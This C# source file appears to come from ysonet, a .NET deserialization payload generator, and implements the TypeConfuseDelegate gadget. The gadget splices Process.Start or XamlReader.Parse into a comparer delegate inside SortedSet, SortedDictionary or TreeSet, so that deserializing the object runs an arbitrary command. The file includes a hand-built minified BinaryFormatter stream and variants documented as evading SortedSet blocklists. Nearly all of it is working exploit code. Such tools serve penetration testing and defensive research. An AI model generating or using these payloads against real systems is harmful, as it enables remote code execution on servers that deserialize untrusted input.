using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegate: James Forshaw's delegate/type confusion.
     *
     * A Comparison<string> is combined with itself, wrapped by Comparer<string>.Create,
     * and handed to a sorted framework container. After the container is filled with two
     * benign strings, invocation-list slot 1 is replaced with Process.Start(string, string).
     * On deserialize the container rebuilds its order, calls the comparer, and the confused
     * return type turns the comparison into a process launch.
     *
     * The attacker primitive is the comparison delegate, not the container. The var/variant
     * option selects which serialized root carries it:
     *   Variant 1 (default): SortedSet<string>. Unchanged, including the hand-built NRBF
     *     minified path used with --minify --ust for BinaryFormatter and LosFormatter.
     *   Variant 2: SortedDictionary<string,string>. A public dictionary root whose private
     *     _set field is a serialized TreeSet<KeyValuePair<string,string>>; its
     *     KeyValuePairComparer forwards key comparisons to the attacker comparer.
     *   Variant 3: TreeSet<string>, the internal set type built by reflection. Its inherited
     *     SortedSet deserialization callback rebuilds the tree and calls the comparer.
     *
     * Variants 2 and 3 exist for one narrow evasion: a SerializationBinder or blocklist that
     * rejects the exact serialized type name System.Collections.Generic.SortedSet but allows
     * SortedDictionary, TreeSet, and the rest of the graph. They do NOT defeat an allowlist,
     * a rule that also rejects TreeSet, or a policy that resolves types and rejects subclasses
     * of SortedSet (TreeSet derives from SortedSet).
     *
     * All three variants are .NET Framework 4.5+ payloads: Comparer<T>.Create and the
     * ComparisonComparer<T> it returns do not exist in 4.0, and the stream carries the .NET 4
     * mscorlib/System assembly identities.
     *
     * GetXamlGadget is the same technique with XamlReader.Parse in slot 1 instead of
     * Process.Start. It shares BuildConfusedContainer, so it offers the same three
     * containers; its callers expose them as their own --rootcontainer option.
     *
     * BuildConfusedContainer also takes the BENIGN Comparison<string> that fills slot 0.
     * Both paths here pass CultureSensitiveCompare (String.Compare), which is what these
     * shipped payloads have always used and what keeps them byte-identical. A gadget whose
     * two strings have a REQUIRED order must pass OrdinalCompare instead, because that
     * comparison sorts the container at BUILD time and therefore decides which string the
     * spliced method receives first - see TypeConfuseDelegateFileOperationsGenerator.
     */
    public class TypeConfuseDelegateGenerator : GenericGenerator
    {
        // Discovery facets (category search only): runs a command directly via a
        // delegate/type confusion in a sorted framework container (mscorlib/System,
        // built-in). All three variants share these facets; only the serialized root
        // container differs, which is a wire-shape choice, not a capability change.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // ComparisonComparer/Comparer.Create are 4.5-era; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "Combines a Comparison<string> with itself, wraps it with "
                + "Comparer<string>.Create, then swaps invocation-list slot 1 for "
                + "Process.Start(string, string). The sorted container calls the comparer "
                + "while rebuilding on deserialize, and the confused return type runs the "
                + "command. The var/variant option picks the serialized root container: "
                + "1 (default) SortedSet<string>; 2 SortedDictionary<string,string>, whose "
                + "serialized TreeSet<KeyValuePair<string,string>> backing set forwards key "
                + "comparisons through SortedDictionary.KeyValuePairComparer; 3 the internal "
                + "System.Collections.Generic.TreeSet<string>, built by reflection. Variants 2 "
                + "and 3 exist for one narrow case: a binder or blocklist that rejects the exact "
                + "wire type name System.Collections.Generic.SortedSet but allows the other "
                + "roots. They do not defeat an allowlist, a rule that also names TreeSet, or a "
                + "policy that resolves types and rejects SortedSet subclasses (TreeSet derives "
                + "from SortedSet). Variants 2 and 3 refuse an input whose executable and argument "
                + "strings compare equal, because both roots reject a duplicate key; variant 1 "
                + "accepts it but its SortedSet then holds one element and does not fire, so make "
                + "the two strings differ. Targets .NET Framework 4.5+ "
                + "(Comparer<T>.Create and ComparisonComparer<T> do not exist in 4.0).";
        }

        public override List<string> Labels()
        {
            // Independent, not GadgetTags.Hosted: this generator owns its chain and
            // hosts other gadgets' payloads (see Generators/HostedPayloads), not the
            // other way round.
            return new List<string> { GadgetTags.Independent };
        }

        private int variant_number = 1; // Default: SortedSet, the original payload

        public override List<GadgetVariant> Variants()
        {
            // No .Without(...) on any variant: the container swap does not change which
            // serializers can carry the delegate graph. All three roots are generic
            // [Serializable] types whose comparer travels through the same
            // DelegateSerializationHolder record, so each variant supports the whole
            // gadget-wide formatter union (verified by generation and marker firing).
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "SortedSet (default)"),
                new GadgetVariant(2, "SortedDictionary root (evasion)"),
                new GadgetVariant(3, "TreeSet root (internal type evasion)")
            };
        }

        public override OptionSet Options()
        {
            return new OptionSet
            {
                {
                    "var|variant=",
                    "Root container: 1 -> SortedSet [default], "
                        + "2 -> SortedDictionary, 3 -> TreeSet (2 and 3 evade an exact "
                        + "SortedSet wire-name blocklist and need distinct command and "
                        + "argument strings)",
                    v =>
                    {
                        int parsed;
                        // Not the usual int.TryParse(v, out variant_number) shortcut: that
                        // silently turns "nope" or "9" into the default variant, which would
                        // hide a typo behind a payload the user did not ask for.
                        if (!int.TryParse(v, out parsed) || parsed < 1 || parsed > 3)
                            throw new OptionException(
                                "variant must be 1, 2, or 3", "variant");
                        variant_number = parsed;
                    }
                }
            };
        }

        // All three container variants ride every advertised formatter, so each token
        // carries the "(3)" variant annotation. SoapFormatter is absent for all of them:
        // every root (SortedSet`1, SortedDictionary`2, TreeSet`1) is a generic type and
        // SoapFormatter cannot serialize one. The delegate is carried by a
        // DelegateSerializationHolder record, which only the runtime formatters and
        // NetDataContractSerializer reproduce; the public-member serializers (Json.NET,
        // XmlSerializer, DataContractSerializer, and the rest) cannot rebuild a
        // MulticastDelegate invocation list.
        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter (3)", "NetDataContractSerializer (3)", "LosFormatter (3)" };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Defensive: Options() already rejects anything outside 1-3, but an internal
            // caller could set the field another way.
            if (variant_number < 1 || variant_number > 3)
                throw new Exception("Unknown TypeConfuseDelegate variant: " + variant_number
                    + " (use 1, 2, or 3).");

            // No variant declares a formatter opt-out today. The call stays so a later
            // opt-out cannot be declared in Variants() without being enforced here.
            GuardVariantFormatter(variant_number, formatter);

            // The hand-built NRBF stream below is a hardcoded SortedSet graph, so it only
            // serves variant 1. Variants 2 and 3 take the normal Serialize() path, which
            // minifies through the same modified BinaryFormatter / LosFormatter helpers.
            if (variant_number == 1 && inputArgs.Minify && inputArgs.UseSimpleType &&
                (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
            {
                // This is to provide even a smaller payload
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                string tcd_json_minified = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': 'System'
}},{'Id': 3,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
      'numMembers': 4,
      'memberNames':['Count','Comparer','Version','Items'],
      'binaryTypeEnumA':[0,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[8,null,8,null],
      'memberAssemIds':[0,0,0,0],
      'assemId': 2
}},{'Id': 4,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 2
}},{'Id': 5,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 3
}},{'Id': 6,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 7,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 4
}},{'Id': 8,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 3,
      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
      'numMembers': 1,
      'memberNames':['_comparison'],
      'binaryTypeEnumA':[1],
      'typeInformationA': null,
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 9,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 10,
    'TypeName': 'ArraySingleString',
    'Data': {
      '$type': 'BinaryArray',
      'objectId': 4,
      'rank': 0,
      'lengthA':[2],
      'lowerBoundA': null,
      'binaryTypeEnum': 0,
      'typeInformation': null,
      'assemId': 0,
      'binaryHeaderEnum': 17,
      'binaryArrayTypeEnum': 0
}},{'Id': 11,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 6,
      'value': '" + inputArgs.CmdArguments + @"'
}},{'Id': 12,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 7,
      'value': '" + inputArgs.CmdFileName + @"'
}},{'Id': 13,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 5,
      'name': 'System.DelegateSerializationHolder',
      'numMembers': 3,
      'memberNames':['Delegate','','x'],
      'binaryTypeEnumA':[1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null],
      'memberAssemIds':[0,0,0],
      'assemId': 0
}},{'Id': 14,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 8
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 17,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 8,
      'name': 'System.DelegateSerializationHolder+DelegateEntry',
      'numMembers': 7,
      'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
      'binaryTypeEnumA':[1,1,1,1,1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,null,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 18,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 11,
      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
}},{'Id': 19,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 12,
      'value': 'mscorlib'
}},{'Id': 20,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 21,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 13,
      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
}},{'Id': 22,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 14,
      'value': 'System.Diagnostics.Process'
}},{'Id': 23,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 15,
      'value': 'Start'
}},{'Id': 24,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 16
}},{'Id': 25,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 9,
      'name': 'x',
      'numMembers': 7,
      'memberNames':['','','','','','',''],
      'binaryTypeEnumA':[1,1,1,1,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,8,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 31,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 33,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 10,
      'mapId': 9
}},{'Id': 34,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 22,
      'value': 'Compare'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 36,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 24,
      'value': 'System.String'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 39,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 40,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 41,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 16,
      'mapId': 8
}},{'Id': 42,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 27,
      'value': 'System.Comparison`1[[System.String]]'
}},{'Id': 43,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 44,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 45,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 46,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 24
}},{'Id': 47,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 22
}},{'Id': 49,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    //BinaryFormatter
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms_bf.Position = 0;
                            SerializersHelper.BinaryFormatter_deserialize(ms_bf);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms_bf.ToArray();
                }
                else
                {
                    // LosFormatter
                    MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms_bf.Position = 0;
                            SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms_lf.ToArray();
                }
            }
            else
            {
                object payload;
                if (variant_number == 2)
                    payload = TypeConfuseDelegateSortedDictionaryGadget(inputArgs);
                else if (variant_number == 3)
                    payload = TypeConfuseDelegateTreeSetGadget(inputArgs);
                else
                    payload = TypeConfuseDelegateGadget(inputArgs);

                return Serialize(payload, formatter, inputArgs);
            }
        }

        /* this can be used easily by the plugins as well */

        // A gadget or plugin that wraps TypeConfuseDelegate as its inner payload calls
        // GenerateInner (see GenericGenerator), not GenerateWithNoTest, so the OUTER
        // module's var/variant never reaches this generator: a value above 3 would fail
        // the whole generation, and 2 or 3 would silently swap the inner container.

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TypeConfuseDelegateGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TypeConfuseDelegateGadget(inputArgs);
        }

        public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
        {
            return BuildCommandContainer(1, inputArgs);
        }

        // Variant 2. Same Comparison<string> -> Process.Start splice as the SortedSet
        // builder. Changed graph: the serialized root is SortedDictionary<string,string>.
        // Its serialized TreeSet<KeyValuePair<string,string>> backing field rebuilds on
        // deserialize, and KeyValuePairComparer forwards key comparisons to the attacker
        // comparer. Target: .NET Framework 4.5+.
        private static object TypeConfuseDelegateSortedDictionaryGadget(InputArgs inputArgs)
        {
            return BuildCommandContainer(2, inputArgs);
        }

        // Variant 3. Same Comparison<string> -> Process.Start splice as the SortedSet
        // builder. Changed root: the internal TreeSet<string>, created by reflection. On
        // deserialization its inherited SortedSet callback rebuilds the tree and calls the
        // attacker comparer. Target: .NET Framework 4.5+.
        private static object TypeConfuseDelegateTreeSetGadget(InputArgs inputArgs)
        {
            return BuildCommandContainer(3, inputArgs);
        }

        // The command path's two elements ARE the two Process.Start arguments, so they come
        // straight from the parsed command and can collide (see RejectEqualKeys).
        private static object BuildCommandContainer(int container, InputArgs inputArgs)
        {
            ReadCommandFromFile(inputArgs);

            string key1 = inputArgs.CmdFileName;
            string key2 = inputArgs.HasArguments ? inputArgs.CmdArguments : "";

            NoteIfArgumentsWillBeSwapped(inputArgs, key1, key2);

            return BuildConfusedContainer(container, CultureSensitiveCompare, ProcessStartSlot1(),
                key1, key2, true);
        }

        // The command path is the one place where the sorted container's ordering rule is
        // NOT enforced, only relied on. BuildConfusedContainer hands its LARGER element to
        // the spliced method's first parameter, so Process.Start only receives the
        // executable in parameter 1 while the executable sorts above the argument string.
        //
        // The default path is safe by construction: -c is wrapped as "cmd /c <command>",
        // so the pair is "cmd" and "/c ...", and "/" sorts below "c". With --rawcmd that
        // wrapper is gone, and a command like "notepad.exe zzz.txt" splits into two strings
        // in the WRONG order, producing Process.Start("zzz.txt", "notepad.exe").
        //
        // Refusing that input would be the stronger fix, and it would cost no payload bytes
        // (the check below uses the very comparison the container sorts with, so every
        // currently-correct payload is untouched). It is a behavior change for existing
        // scripts, though, so for now this only NOTES the problem - and only in debug mode,
        // because ysonet is embedded by other tools whose wrappers merge stderr into the
        // payload they capture. See dev-kitchen/todo/tcd-command-argument-order-unguarded.md.
        //
        // Deliberately strict "less than": an EQUAL pair is a different, already documented
        // problem (containers 2 and 3 refuse it in RejectEqualKeys, container 1 collapses to
        // one element and does not fire), and it needs its own message, not this one.
        private static void NoteIfArgumentsWillBeSwapped(InputArgs inputArgs, string key1, string key2)
        {
            if (CultureSensitiveCompare(key1, key2) >= 0)
                return;

            Debugging.ShowNote(inputArgs,
                "[TypeConfuseDelegate] The executable string sorts BELOW the argument string, "
                + "so this payload calls Process.Start(\"" + key2 + "\", \"" + key1 + "\") - the "
                + "two are swapped. The sorted container always hands its larger element to the "
                + "first parameter. Drop --rawcmd (the 'cmd /c' wrapper always sorts correctly), "
                + "or change the command so the executable sorts above its arguments.");
        }

        // The benign comparison the SHIPPED command and XAML payloads have always used.
        // It is String.Compare(string,string), which is culture-sensitive: keep it here so
        // those payloads stay byte-for-byte identical. A caller that needs deterministic,
        // culture-independent ordering passes String.CompareOrdinal instead (see
        // TypeConfuseDelegateFileOperationsGenerator).
        public static readonly Comparison<string> CultureSensitiveCompare =
            new Comparison<string>(String.Compare);

        // Ordinal ordering: compares UTF-16 code units, so the order a payload is built
        // with does not depend on the operator's current culture. A gadget whose two
        // strings have a REQUIRED order (the sink's first and second argument) must use
        // this, so its generation-time guard and the serialized order agree.
        public static readonly Comparison<string> OrdinalCompare =
            new Comparison<string>(String.CompareOrdinal);

        // The delegate spliced into invocation-list slot 1 by the command path.
        private static Delegate ProcessStartSlot1()
        {
            return new Func<string, string, Process>(Process.Start);
        }

        // The shared body of every TypeConfuseDelegate payload, command path and XAML path
        // alike. Builds the Comparison<string> combined with itself, wraps it in
        // Comparer<string>.Create, fills the chosen sorted root with the two elements while
        // the comparison is still benign, then swaps invocation-list slot 1 for the attacker
        // delegate.
        //
        // container: 1 SortedSet (the original payload), 2 SortedDictionary, 3 TreeSet.
        // benignComparison: the harmless Comparison<string> that fills invocation-list slot
        //            0 and that the container sorts with WHILE IT IS BEING FILLED here. It
        //            therefore decides the order the two elements are serialized in, which
        //            is what decides the spliced method's argument order on the target. Use
        //            CultureSensitiveCompare to keep an existing payload identical, or
        //            OrdinalCompare when the caller must guarantee that order up front.
        // slot1:     the Delegate that replaces slot 1 (Func<string,string,Process> for the
        //            command path, Func<string,object> for the XAML path, an
        //            Action<string,string> for the file-operation path).
        // key1/key2: the two elements. On deserialize the SMALLER-sorting one is inserted
        //            first as the root and the larger is compared against it, so the larger
        //            element becomes the spliced method's FIRST argument.
        // keysMayCollide: true when the two elements come from user input and can compare
        //            equal, which containers 2 and 3 must refuse (see RejectEqualKeys). The
        //            XAML path passes false: its elements are the XAML string and "", and a
        //            XAML document is never empty, so they always differ. The file-operation
        //            path passes false too, because its own strict ordering guard has already
        //            rejected an equal pair with a message that names the operation.
        internal static object BuildConfusedContainer(
            int container, Comparison<string> benignComparison, Delegate slot1,
            string key1, string key2, bool keysMayCollide)
        {
            if (container < 1 || container > 3)
                throw new Exception("Unknown TypeConfuseDelegate container: " + container
                    + " (use 1, 2, or 3).");
            if (benignComparison == null)
                throw new ArgumentNullException("benignComparison");

            Delegate da = benignComparison;
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);

            if (keysMayCollide && container != 1)
                RejectEqualKeys(comp, key1, key2, container == 2 ? "SortedDictionary" : "TreeSet");

            object root;
            if (container == 2)
            {
                SortedDictionary<string, string> dictionary =
                    new SortedDictionary<string, string>(comp);
                dictionary.Add(key1, "");
                dictionary.Add(key2, "");
                root = dictionary;
            }
            else if (container == 3)
            {
                // Resolve TreeSet from the assembly that defines SortedSet, so the internal
                // type always comes from the same mscorlib we are building against.
                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
                    "System.Collections.Generic.TreeSet`1", false);
                if (openTreeSet == null)
                    throw new PlatformNotSupportedException(
                        "TreeSet is unavailable; this container requires .NET Framework 4.5+.");

                Type closedTreeSet = openTreeSet.MakeGenericType(typeof(string));
                // TreeSet is internal but its IComparer<T> constructor is public.
                root = Activator.CreateInstance(closedTreeSet, new object[] { comp });
                ICollection<string> items = (ICollection<string>)root;
                items.Add(key1);
                items.Add(key2);
            }
            else
            {
                SortedSet<string> set = new SortedSet<string>(comp);
                set.Add(key1);
                set.Add(key2);
                root = set;
            }

            SpliceSlot1(d, slot1);

            return root;
        }

        // The -c value can name a file holding the real command.
        private static void ReadCommandFromFile(InputArgs inputArgs)
        {
            string cmdFromFile = inputArgs.CmdFromFile;

            if (!string.IsNullOrEmpty(cmdFromFile))
            {
                inputArgs.Cmd = cmdFromFile;
            }
        }

        // SortedDictionary and TreeSet reject a duplicate key, and the two compared strings
        // ARE the two arguments to Process.Start. There is no way to make them distinct
        // without changing the command (appending a NUL would also break it), so this rare
        // input is refused with a clear message instead of silently altering the payload.
        //
        // Do NOT point the user at variant 1 as a workaround: SortedSet accepts the input but
        // silently drops the duplicate, so the serialized set holds ONE element, and on
        // deserialize SortedSet.AddIfNotPresent returns at the empty-root case without ever
        // calling the comparer. That payload generates and never fires. The only real fix is
        // for the two strings to differ.
        private static void RejectEqualKeys(IComparer<string> comp, string key1, string key2, string container)
        {
            if (comp.Compare(key1, key2) == 0)
                throw new ArgumentException(container + " requires the executable and argument "
                    + "strings to compare as distinct values (got \"" + key1 + "\" twice). "
                    + "Change the command so they differ: variant 1 accepts this input, but its "
                    + "SortedSet collapses to one element and that payload does not fire either.");
        }

        // The last step for every container: replace invocation-list slot 1 with the
        // attacker delegate, after the container has been filled while the comparison was
        // still benign.
        private static void SpliceSlot1(Comparison<string> d, Delegate slot1)
        {
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = slot1;
            fi.SetValue(d, invoke_list);
        }

        // The XAML path. Same delegate/type confusion, but slot 1 becomes
        // XamlReader.Parse(string) and the two elements are the XAML document and "".
        // Used by the hosted gadgets ActivitySurrogateDisableTypeCheck and
        // XamlAssemblyLoadFromFile.
        //
        // Every container here is a GENERIC type (SortedSet`1, SortedDictionary`2,
        // TreeSet`1), and SoapFormatter cannot serialize a generic type, so any gadget
        // variant that wraps its XAML here must declare .Without(Formatters.SoapFormatter)
        // in Variants() and call GuardVariantFormatter in Generate().
        public static object GetXamlGadget(string xaml_payload)
        {
            return GetXamlGadget(xaml_payload, 1);
        }

        // container: 1 SortedSet (default, the original payload), 2 SortedDictionary,
        // 3 TreeSet. 2 and 3 exist for the same narrow evasion as the command-path
        // variants: a binder or blocklist that rejects the exact wire type name
        // System.Collections.Generic.SortedSet.
        //
        // The two elements are the XAML document and "", so unlike the command path they
        // can never collide: "" sorts smallest, which also makes the XAML string the
        // larger element and therefore the FIRST argument handed to XamlReader.Parse.
        public static object GetXamlGadget(string xaml_payload, int container)
        {
            Delegate slot1 = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
            return BuildConfusedContainer(container, CultureSensitiveCompare, slot1,
                xaml_payload, "", false);
        }

        // The option name every gadget that exposes the container choice uses, so the
        // flag reads the same everywhere. "rootcontainer", not "container": this picks the
        // serialized ROOT of the payload graph, and a bare "container" reads like a
        // deployment container to anyone skimming the options.
        public const string RootContainerOptionName = "rootcontainer";

        // The XAML wrappers kept their original constant name; it is the same option.
        public const string XamlRootContainerOptionName = RootContainerOptionName;

        // The part of the help text that is true for every consumer, so one wording
        // describes the choice and each gadget only adds what is specific to it.
        public const string RootContainerOptionHelp =
            "Serialized root container: 1 -> SortedSet [default], 2 -> SortedDictionary, "
            + "3 -> TreeSet. 2 and 3 evade a binder or blocklist that rejects the exact "
            + "SortedSet wire type name.";

        public const string XamlRootContainerOptionHelp =
            "Serialized root container of the TypeConfuseDelegate wrapper: "
            + "1 -> SortedSet [default], 2 -> SortedDictionary, 3 -> TreeSet. 2 and 3 evade "
            + "a binder or blocklist that rejects the exact SortedSet wire type name. Not "
            + "used by the TextFormattingRunProperties wrapper (variant 2), which has no "
            + "container.";

        // Shared strict parser for that option. Not the usual
        // int.TryParse(v, out container) shortcut: that silently turns "nope" or "9" into
        // the default container, which would hide a typo behind a payload the user did not
        // ask for.
        public static int ParseRootContainerOption(string value)
        {
            int parsed;
            if (!int.TryParse(value, out parsed) || parsed < 1 || parsed > 3)
                throw new OptionException(RootContainerOptionName + " must be 1, 2, or 3",
                    RootContainerOptionName);
            return parsed;
        }

        // Kept as the name the XAML wrappers already call.
        public static int ParseXamlRootContainerOption(string value)
        {
            return ParseRootContainerOption(value);
        }

    }
}
